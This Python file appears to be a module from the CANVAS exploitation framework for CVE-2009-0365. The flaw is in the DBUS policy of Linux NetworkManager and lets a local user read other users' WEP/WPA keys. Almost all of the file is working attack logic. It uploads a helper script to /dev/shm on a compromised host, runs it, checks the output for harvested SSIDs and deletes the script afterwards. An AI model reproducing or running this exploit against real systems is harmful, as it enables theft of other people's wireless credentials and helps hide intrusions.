#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys, os
if "." not in sys.path: sys.path.append(".")

from ExploitTypes.localcommand import LocalCommand
from canvaserror import *
import canvasengine

NAME                           = "NetworkManager: GetSecrets disclosure"
DESCRIPTION                    = "Incorrect DBUS deny statement setting allows access to NetworkManager secrets of other users (such WEP/WPA keys)"
DOCUMENTATION                  = {}
DOCUMENTATION["VENDOR"]        = "Linux"
DOCUMENTATION["Date public"]   = "03/03/2009"
DOCUMENTATION["CERT Advisory"] = None
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://www.securityfocus.com/bid/33966"
DOCUMENTATION["CVE Name"]      = "CVE-2009-0365"
DOCUMENTATION["CVE Url"]       = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0365"
DOCUMENTATION['CVSS']          = 4.6
DOCUMENTATION["Notes"]         = """This allows you to get secrets about wireless network connections from the NetworkManager (0.6.x and 0.7.x) for connections that other users have set up,
for it to work correctly another user must be logged in with NetworkManager running in their context (e.g. have the nm-applet running in their task bar). The exploit simply
uploads a path script to do the querying of the DBUS interfaces. The dbus python package is required to be present on the target for the script to run correctly, however 
this appears to be installed by default on most modern linux distributions. If it is not you could always upload and install it yourself :) """

VERSION                        = "1.0"
GTK2_DIALOG                    = "dialog.glade2"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Commands"
PROPERTY['SITE']               = "Local"
PROPERTY['ARCH']               = [ ["Linux"] ]
PROPERTY['VERSION']            = [ ]

NOTES                          = """
"""

CHANGELOG                      = """
"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name=NAME 
        self.filename="nm.py"
        self.temp_loc="/dev/shm/"
        
    def run(self):
        self.host=self.target.interface
        self.setInfo("%s (in progress)" % (self.name))
        
        for node in self.argsDict["passednodes"]:
            nodetype        = node.nodetype
            capabilities    = node.capabilities
            
            if node.nodetype in ["linuxNode"]:            
                self.log( "uploading %s"%(self.filename))
                
                try:
                    node.shell.upload(os.path.join(self.engine.config["canvas_resources"], self.filename), self.temp_loc)
                except NodeCommandError, err:
                    self.log("Could not upload required component: %s"%err)
                    ret = 0
                    break
                
                self.remote_filename=os.path.join(self.temp_loc,"nm.py")
            
                self.log('Running command: python %s'%(self.remote_filename))
                try:
                    ret_cmd=node.shell.runcommand('python %s'%(self.remote_filename))
                    self.log('Network Manager returned:\n %s'%(ret_cmd))
                except NodeCommandError, err:
                    self.log("Could not execute command: %s"%err)
                    ret = 0
                    break
                
                ##Did the script actually get some damn secrets?
                if not "SSID" in ret_cmd:
                    self.log("Script executed correctly but didn't seem to find any secrets available")
                    ret=0
                    
                
                ##Remove file
                try:
                    node.shell.unlink(self.remote_filename)
                except NodeCommandError, err:
                    self.log("Could not remove uploaded file: %s"%err)
                    ret = 0
                    break
                
                ret = 1
                
            
            else:
                self.log("Node '%s' does is not of the required type which is 'linuxNode' "%(node.nodetype))
                ret=0
                
            self.setInfo("%s - (finished)" % (NAME))
                
            return ret
    

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
